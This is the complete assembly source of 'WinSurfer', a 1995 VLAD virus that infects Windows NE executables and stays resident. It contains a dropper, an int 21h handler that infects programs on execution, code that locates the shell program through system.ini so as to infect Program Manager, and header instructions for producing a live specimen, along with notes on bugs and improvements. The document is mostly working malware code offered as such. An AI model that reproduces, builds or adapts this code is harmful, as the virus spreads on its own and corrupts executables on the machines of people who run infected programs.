
;-------------------------------------------------------------------------
;
;       WinSurfer Virus (c) 1995 VLAD incorporated.
;               Written by qark and quantum.
;
;  This virus is a parasitic TSR infector of NewEXE files.  It works in 
;  protected mode only and infects on file execute.
;
;  The executable infection code is by qark, while the interrupt handler
;  code is by quantum.
;
;  This virus contains no stealth of any form, a simple readonly attribute
;  will stop the virus from writing, the time/date stamp is not preserved
;  and there is no encryption of any form.  Windows users are too dumb to
;  notice anyway.
;
;  To obtain a specimen of the virus, copy the compiled com file into the
;  same directory as the file WINMINE.EXE and run it.  Go into Windows
;  and run the game 'Minesweeper'.  Minesweeper should infect program
;  manager direct action, so that next time windows is booted the virus
;  will be resident.
;
;  Possible Bugs and Improvements:
;   1) An error may be that if the file isn't exactly shift alignment sized
;   the virus will overwrite some data at the end of the file or be
;   incorrectly pointed.
;   2) An error may occur if the end of the segment table is less than eight
;   bytes from a 512 byte divisor.
;   3) It may be possible to allocate buffer space without adding to virus
;   size by changing the segment memory size in the segment table. At the
;   moment the virus size is being doubled by the 512 byte read buffer we
;   include in the disk image.
;
;  Although the final virus was coded completely by quantum and I, many
;  people helped by offering ideas, and windows documentation so I
;  must give thanks to the following people:
;  Screaming Radish, Stalker X, Dreadlord and some scandinavian dude.
;  The most important help came from Malware who taught me the relocation
;  entry ffff trick.
;
;  Assemble with a86.
;-------------------------------------------------------------------------


;--Directly below is dropper code, ignore it, page down to the virus code--

        mov     ax,3d02h
        mov     dx,offset fname
        int     21h
        xchg    bx,ax
        
        mov     ah,3fh
        mov     cx,512
        mov     dx,offset buffer
        int     21h

        mov     si,offset buffer
        cmp     word ptr [si+3ch],400h
        je      ok_dropper
        int     20h
ok_dropper:
        mov     ax,word ptr [si+2]
        mov     word ptr ppage,ax
        mov     ax,word ptr [si+4]
        mov     word ptr pfile,ax

        mov     ax,4200h
        xor     cx,cx
        cwd
        int     21h

        mov     ah,40h
        mov     cx,offset setsp - offset header
        mov     dx,offset header
        int     21h

        mov     ax,4200h
        xor     cx,cx
        mov     dx,word ptr [si+3ch]
        int     21h

        mov     ah,3fh
        mov     cx,512
        mov     dx,offset buffer
        int     21h

        mov     ax,word ptr [si+1ch]
        inc     word ptr [si+1ch]       ;increase segment count
        mov     cl,8
        mul     cl
        
        mov     di,word ptr [si+22h]
        add     di,si
        add     di,ax

        mov     ax,4202h
        xor     cx,cx
        cwd
        int     21h
        
        ;write in the new segment into the table
        
        mov     cl,byte ptr [si+32h]
        push    bx
        mov     bx,1
        shl     bx,cl
        mov     cx,bx
        pop     bx
        div     cx

        mov     word ptr [di],ax
        mov     word ptr [di+2],winend-win_entry
        mov     word ptr [di+4],180h
        mov     word ptr [di+6],winend-win_entry

        mov     ax,word ptr [si+14h]
        mov     word ptr winip2,ax

        mov     word ptr [si+14h],0

        mov     ax,word ptr [si+16h]
        mov     word ptr wincs2,ax
        mov     ax,word ptr [si+1ch]    ;new cs:ip
        mov     word ptr [si+16h],ax

        mov     ah,40h
        mov     cx,winend-win_entry + 20h
        mov     dx,offset win_entry
        int     21h

        add     word ptr [si+4],512

        add     word ptr [si+24h],512
        add     word ptr [si+26h],512
        add     word ptr [si+28h],512
        add     word ptr [si+2ah],512

        mov     dx,512
        mov     ax,4200h
        xor     cx,cx
        int     21h
        
        mov     ah,40h
        mov     cx,512
        mov     dx,offset buffer
        int     21h
        
        mov     ah,3eh
        int     21h

        int     20h

;--The New Windows DOS stub--
header  db      'MZ'
ppage   dw      0       ;part page
pfile   dw      0       ;file/512
        dw      0       ;relocation items
        dw      10h     ;header size/16
        dw      0       ;minmem
        dw      -1      ;maxmem
        dw      0       ;SS
        dw      offset setsp - offset winstart ;SP
        dw      0       ;checksum
        dw      0       ;IP
        dw      0       ;CS
        dw      40h     ;Relocation offset
        dupsize1        equ 3ch - ($-offset header)
        db      dupsize1 dup (0)
        dw      200h    ;NE offset
        dupsize2        equ 100h - ($-offset header)
        db      dupsize2 dup (0)
winstart:
        call    windowsmsg
        db      'This program requires Microsoft Windows.',0dh,0ah,'$'
windowsmsg:
        pop     dx
        push    cs
        pop     ds
        mov     ah,9
        int     21h
        mov     ax,4c01h
        int     21h
        db      100 dup (0)
setsp:
;---end of fake dropper dos stub--

fname   db      'winmine.exe',0


;----Start of the Virus---All the above is the dropper code, ignore it-------

win_entry:                      ;Infected windows executables start here.
        jmp     realenter

int21start:                             ;Virus Int21 handler

        cmp     ax,1894h                ;Residency test ?
        jnz     nottest
        mov     cx,1234h
        iret
nottest:

        pusha
        push    ds
        push    es

        cmp     ah,4bh                  ;Windows is so dumb it uses DOS to
                                        ;execute.
        jnz     return2int
        call    executing

return2int:

        pop     es
        pop     ds
        popa

        db      0eah
oldint21        dw      0,0

executing:
        
        mov     ax,3d02h                ;Open file in DS:DX
        int     21h
        jnc     ok_open
        ret
ok_open:
        push    ax
        mov     ax,0ah                  ;This function makes our CS writable.
        push    cs
        pop     bx
        int     31h
        push    ax
        pop     ds
        pop     bx

        mov     ah,3fh                  ;Read first 512 bytes of EXE header.
        mov     cx,512
        mov     dx,offset buffer-offset win_entry
        int     21h

        mov     si,offset buffer-offset win_entry

        cmp     word ptr [si],'ZM'      ;Not a COM file.
        jne     bad_open
        cmp     word ptr [si+18h],40h           ;40h+ for NE exe's
        jb      bad_open
        cmp     word ptr [si+3ch],400h          ;header will be below if
        je      fileisoktoinfect                ;already infected...
bad_open:
        jmp     fileisunsuitable

fileisoktoinfect:
        sub     word ptr [si+3ch],8     ;Change NE pointer.
        sub     word ptr [si+10h],8     ;Incase stack is end of header
         
        mov     ax,4200h                ;Lseek right back to the start.
        xor     cx,cx
        cwd
        int     21h

        mov     ah,40h                  ;Rewrite the modified DOS header.
        mov     cx,512
        mov     dx,offset buffer - offset win_entry
        int     21h
        jc      bad_open                ;Write fail.. outta here!

        mov     ax,4200h                ;Lseek to NE header.
        xor     cx,cx
        mov     dx,400h
        int     21h

        mov     ah,3fh                  ;Read in first 512 bytes.
        mov     cx,512
        mov     dx,offset buffer - offset win_entry
        int     21h

        ;Adjust header offsets.  Any tables behind the segment table will 
        ;have their offset increased by eight because we are inserting a new
        ;eight byte segment entry.

        mov     ax,word ptr [si+22h]    ;AX=Segment table offset.
        cmp     word ptr [si+4],ax
        jb      ok_et
        add     word ptr [si+4],8
ok_et:
        cmp     word ptr [si+24h],ax
        jb      ok_rt
        add     word ptr [si+24h],8
ok_rt:
        cmp     word ptr [si+26h],ax
        jb      ok_rnt
        add     word ptr [si+26h],8
ok_rnt:
        cmp     word ptr [si+28h],ax
        jb      ok_mrt
        add     word ptr [si+28h],8
ok_mrt:
        cmp     word ptr [si+2ah],ax
        jb      ok_int
        add     word ptr [si+2ah],8
ok_int:
        
        mov     ax,word ptr [si+1ch]
        inc     word ptr [si+1ch]       ;Increase segment count.
        mov     cl,8                    ;Assume less than 256 segments.
        mul     cl

        add     ax,word ptr [si+22h]    ;AX=Size of segment table.
        xor     dx,dx                   ;High order division value.
        mov     cx,512                  ;512 byte portions are used
                                        ; for the reads later on.
        div     cx

        mov     word ptr [offset ne_size-offset win_entry],ax 
                                        ;How much we'll have to read.
        mov     word ptr [offset last_ne-offset win_entry],dx
                                        ;Where the end of the segment table
                                        ; will be when we read it into the
                                        ; buffer. (The last buffer)

        ;Put the original CS:IP into our relocation table.
        push    word ptr [si+14h]
        pop     word ptr [offset newwinip2 - offset win_entry]
        push    word ptr [si+16h]
        pop     word ptr [offset newwincs2 - offset win_entry]

        ;Save the alignment shift count because we need that for calculating
        ;the offset of our segment when writing the segment entry.
        push    word ptr [si+32h]
        pop     word ptr [offset al_shift - offset win_entry]

        ;Point CS:IP to the virus.
        mov     word ptr [si+14h],0     ;The new IP
        mov     ax,word ptr [si+1ch]
        mov     word ptr [si+16h],ax    ;The new CS

        ;Initialise the lseek variable
        mov     word ptr [offset lseek-offset win_entry],400h

        ;The below code gets the NE header and keeps moving it forward by
        ;eight bytes in 512 byte chunks.
move_header_forward:        
        mov     ax,word ptr [offset ne_size-offset win_entry]
        or      ax,ax
        jz      last_page

        dec     word ptr [offset ne_size-offset win_entry]

        mov     ax,4200h                ;Lseek to our current position.
        xor     cx,cx
        mov     dx,word ptr [offset lseek-offset win_entry]
        sub     dx,8
        int     21h
        
        mov     ah,40h                  ;Write the header section out.
        mov     cx,512
        mov     dx,si
        int     21h
        
                                        ;Advance the pointer by 512.
        add     word ptr [offset lseek-offset win_entry],512
        
        mov     ax,4200h                ;Lseek to the next chunk.
        xor     cx,cx
        mov     dx,word ptr [offset lseek-offset win_entry]
        int     21h

        mov     ah,3fh                  ;Read it.
        mov     dx,offset buffer - offset win_entry
        mov     cx,512
        int     21h

        jmp     move_header_forward

last_page:
        mov     ax,4202h                ;Lseek to end of file.
        xor     cx,cx
        cwd
        int     21h                     ;File length into DX:AX

        ;DX:AX=File offset of our segment
        ;Below section shifts the segment offset right by the alignment
        ;shift value.
        mov     cl,byte ptr [offset al_shift - offset win_entry]
        push    bx
        mov     bx,1
        shl     bx,cl
        mov     cx,bx
        pop     bx
        div     cx

        mov     di,si
        add     di,word ptr [offset last_ne-offset win_entry]

        ;Adding the new segment table entry
        mov     word ptr [di],ax        ;Segment offset
        mov     word ptr [di+2],offset winend-offset win_entry
        mov     word ptr [di+4],180h    ;Segment attribute
                                        ; 180h = NonMovable + Relocations
        mov     word ptr [di+6],offset winend-offset win_entry
        
        mov     ax,4200h        ;Lseek to next position.
        xor     cx,cx
        mov     dx,word ptr [offset lseek-offset win_entry]
        sub     dx,8
        int     21h
        
        mov     ah,40h          ;Write rest of NE header + new seg entry.
        mov     cx,word ptr [offset last_ne-offset win_entry]
        add     cx,8            ;Added segment entry means eight more.
        mov     dx,offset buffer - offset win_entry
        int     21h

        ;Reset the relocatable pointer.
        push    word ptr [offset winip - offset win_entry]
        push    word ptr [offset wincs - offset win_entry]
        mov     word ptr [offset winip - offset win_entry],0
        mov     word ptr [offset wincs - offset win_entry],0ffffh

        mov     ax,4202h        ;Lseek to end of file.
        xor     cx,cx
        cwd
        int     21h
        
        mov     ah,40h          ;Write main virus body.
        mov     cx,offset winend-offset win_entry
        xor     dx,dx
        int     21h

        pop     word ptr [offset wincs - offset win_entry]
        pop     word ptr [offset winip - offset win_entry]

        mov     ah,40h          ;Write the relocation item.
        mov     cx,offset winend-offset relocblk
        mov     dx,offset relocblk-offset win_entry
        int     21h

fileisunsuitable:
        
        mov     ah,3eh          ;Close file.
        int     21h

        ret

        prefix          db      'hell='
        windir          db      'indir='
        systemfile      db      'system.ini',0
        NE_Size         dw      0
        Last_NE         dw      0
        Al_Shift        dw      0
        LSeek           dw      0
        progman         db      0       ;1=Program Manager
        envir           dw      0       ;environment segment
        pathbuff        db      142 dup (0)
realenter:

        pusha
        push    si
        push    di
        push    ds
        push    es
        
        mov     ax,1686h                    ;Is DPMI available ?
        int     2fh
        or      ax,ax
        jz      dpmifound
no_dpmi:
        jmp     alreadyinmem
dpmifound:
        mov     ax,000ah                    ;Make CS writable.
        push    cs                          ;Protected mode isn't protected.
        pop     bx
        int     31h                         ;Use DPMI.
        push    ax
        pop     ds

        xor     cx,cx                       ;Check if resident.
        mov     ax,1894h
        int     21h

        cmp     cx,1234h                    ;Must be resident..
        jz      no_dpmi

        cmp     byte ptr [offset progman - offset win_entry],1
        jne     direct_progman

        mov     byte ptr [offset progman - offset win_entry],0
        
        ;Can't go TSR off any program but program manager.
        mov     ax,0204h                    ;Get real mode interrupt vector.
        mov     bl,21h
        int     31h

        mov     ds:[offset oldint21 - win_entry],dx
        mov     ds:[offset oldint21 - win_entry + 2],cx

        push    cs
        pop     cx
        mov     dx,offset int21start-win_entry
        mov     ax,0205h
        mov     bl,21h
        int     31h                         ;Set real mode interrupt vector.
        jmp     alreadyinmem

direct_progman:
        ;Next portion of code searches for the environment variable
        ;'windir' and places that before the files we access.
        
        ;On entry ES=PSP

        mov     ax,word ptr es:[2ch]    ;PSP:[2ch]=Environment segment.
        
        cld
        
        mov     es,ax

        mov     al,'w'                  ;w from windir
        mov     cx,-1
        xor     di,di
        mov     dx,di
dir_loop:
        mov     di,dx
        repnz   scasb
        mov     dx,di
        mov     si,offset windir-win_entry
        push    cx
        mov     cx,6
        repe    cmpsb                   ;indir from windir
        pop     cx
        jne     dir_loop
        mov     si,di
        mov     ax,ds
        push    es
        pop     ds
        mov     es,ax
        mov     cx,128
        mov     di,offset pathbuff-win_entry
        rep     movsb                   ;Move it into our path buffer.
        push    es
        pop     ds

        mov     di,offset pathbuff-win_entry
        mov     al,0
        mov     cx,128
        repnz   scasb
        mov     byte ptr es:[di-1],'\'          ;Add a slash behind the path.
        mov     si,offset systemfile -offset win_entry
        mov     cx,11
        rep     movsb

        ;The below code reads in the 'system.ini' file and searches for
        ;the 'shell=' value, and infects the program specified by it.
        ;The windows shell (eg program manager) is always active in memory
        ;and we use it to go resident off.

        mov     ax,3d02h
        mov     dx,offset pathbuff -offset win_entry
        int     21h

        jc      alreadyinmem
        xchg    bx,ax

        mov     ah,3fh
        mov     cx,512
        mov     dx,offset buffer -offset win_entry
        int     21h

        mov     ah,3eh
        int     21h

        push    ds
        pop     es

        mov     di,offset buffer-offset win_entry
        mov     dx,di

        cld
        mov     cx,512
shell_loop:
        mov     di,dx
        mov     al,'s'                  ;The 's' in 'shell='
        repne   scasb
        jne     alreadyinmem
        mov     dx,di

        mov     si,offset prefix -offset win_entry ;Test for 'hell='
        push    cx
        mov     cx,5
        repe    cmpsb
        pop     cx
        jne     shell_loop
        mov     si,di                   ;Offset of filename into DX.

        mov     al,'.'                  ;The dot in the filename extension.
        mov     cl,0ffh
        repne   scasb
        add     di,3                    ;Point to past the filename.
        mov     byte ptr es:[di],0      ;Add a zero to make it asciiz.

        mov     di,offset pathbuff-win_entry
        mov     al,0
        mov     cx,128
        repnz   scasb                   ;Search for the 0 at the path end.
        dec     di
        mov     al,'\'                  ;Now find the last backslash.
        mov     cx,128
        std                             ;Scan backwards.
        repnz   scasb
        cld
        inc     di                      ;DI points behind the final '\'
        inc     di
        mov     cx,15
        rep     movsb                   ;Append the shell program name.
        mov     dx,offset pathbuff-win_entry

        mov     byte ptr [offset progman - offset win_entry],1
        call    executing
        mov     byte ptr [offset progman - offset win_entry],0

alreadyinmem:

        pop     es
        pop     ds
        pop     di
        pop     si
        popa

        db      0eah                    ;JMP FAR PTR xxxx:xxxx
winip   dw      0
wincs   dw      0ffffh                  ;Needs to be FFFF due to windows
                                        ; relocation item format.
buffer  db      512 dup (0)

;Below is the relocation item format.  What ours does is turn the far jump
; above us into a jump to the original CS:IP.
relocblk        dw      1               ;Signal only one relocation item.
                db      3               ;32 bit pointer relocation.
                db      4               ;Additive relocation (unsure, but
                                        ; it doesnt work unless you put this)
                dw      offset winip-offset win_entry ;Relocation offset.
newwincs2       dw      0               ;Target of the relocation. (We use
newwinip2       dw      0               ; the original host CS:IP)

winend:                         ;The actual virus ends here.
;-----End of the Virus---Below is dropper code-----------------------------
        dw      1
        db      3
        db      4
        dw      offset winip - offset win_entry
wincs2  dw      0
winip2  dw      0

